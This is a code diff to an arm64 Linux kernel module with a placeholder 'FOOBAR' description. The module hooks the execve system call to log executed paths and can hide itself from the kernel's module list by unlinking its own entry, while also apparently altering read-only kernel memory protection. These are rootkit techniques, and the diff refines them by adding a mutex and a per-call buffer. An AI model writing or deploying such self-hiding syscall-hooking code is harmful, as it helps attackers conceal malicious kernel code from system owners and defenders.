@@ -20,8 +20,8 @@ MODULE_DESCRIPTION("FOOBAR");
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.1");
 
+DEFINE_MUTEX(is_hide_mutex);
 static long is_hide;
-static char path[PATH_MAX];
 
 struct list_head *modules_;
 static int (*access_remote_vm_)(struct mm_struct *mm, unsigned long addr,
@@ -35,9 +35,16 @@ static unsigned long __start_rodata_, __end_rodata_;
 
 static long hook_execve(const struct pt_regs *regs)
 {
+	char *path;
+
+	path = kmalloc(sizeof(char) * PATH_MAX, GFP_KERNEL);
+	if (path == NULL)
+		return -EFAULT;
 	if (copy_from_user(path, (void *)regs->regs[0], PATH_MAX))
 		pr_info("copy_from_user fail.\n");
 	pr_info("exec %s\n", path);
+	kfree(path);
+
 	return __arm64_sys_execve_(regs);
 }
 
@@ -103,6 +110,7 @@ static void update_rodata_prot(void)
 
 static void do_hide(void)
 {
+	mutex_lock(&is_hide_mutex);
 	if (is_hide) {
 		list_add_rcu(&(THIS_MODULE->list), modules_);
 		is_hide = 0;
@@ -110,6 +118,7 @@ static void do_hide(void)
 		list_del_rcu(&(THIS_MODULE->list));
 		is_hide = 1;
 	}
+	mutex_unlock(&is_hide_mutex);
 }
 
 /*
